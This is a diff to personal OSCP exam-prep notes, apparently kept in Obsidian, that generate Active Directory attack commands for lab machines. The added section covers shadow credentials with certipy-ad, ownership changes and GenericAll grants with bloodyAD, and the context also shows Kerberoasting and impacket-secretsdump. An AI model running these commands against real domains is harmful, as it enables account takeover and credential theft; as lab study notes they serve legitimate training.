@@ -25,6 +25,42 @@ $SecPassword = ConvertTo-SecureString "pass123!" -AsPlainText -Force Set-ADAccou
 EvilwinRM into their new creds
 
 ---
+# Write-Owner
+
+As the owner of a user, I could add a shadow credential:
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `certipy-ad shadow auto -u [adminUser]@${discoveredDomain} -p [adminPW] -account '[targetUser]' -dc-ip ${ip}`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+Make this target account owned by our account first.
+## Change Account Owner
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `bloodyAD -d ${discoveredDomain} --host ${ip} -u [adminUser] -p [adminPW] set owner [targetAccountName] [AdminAccountName]`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+## Give GenericAll
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `bloodyAD -d ${discoveredDomain} --host ${ip} -u [adminUser] -p [adminPW] add genericAll [targetUser] [adminUser]`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+---
 ## Abuse the `Account Operators` permissions
 
 Add an account into this vulnerable group using `GenericAll` to progress to the next step
@@ -109,7 +145,7 @@ Import-Module .\PowerView.ps1
 ---
 
 ```
-$SecPassword = ConvertTo-SecureString 'pass123' -AsPlainText -Force
+$SecPassword = ConvertTo-SecureString 'pass123!' -AsPlainText -Force
 ```
 
 Replace `htb` with the short NetBIOS domain name of the PG machine (e.g., `pg`, `offsec`, or whatever domain short-name is listed in your enumeration/BloodHound).
@@ -197,7 +233,7 @@ MODIFY VV
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
-const command = `cp ~/Desktop/Tools/Windows . && python3 targetedKerberoast.py --dc-ip '${ip}' -v -d '${discoveredDomain}' -u '[user]' -p '[password]'`;
+const command = `cd ~/Desktop/Tools/Windows/ && python3 targetedKerberoast.py --dc-ip '${ip}' -v -d '${discoveredDomain}' -u '[user]' -p '[password]'`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
@@ -239,4 +275,6 @@ const command = `impacket-secretsdump [user]:[pw]@${discoveredDomain}`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+---
+
 
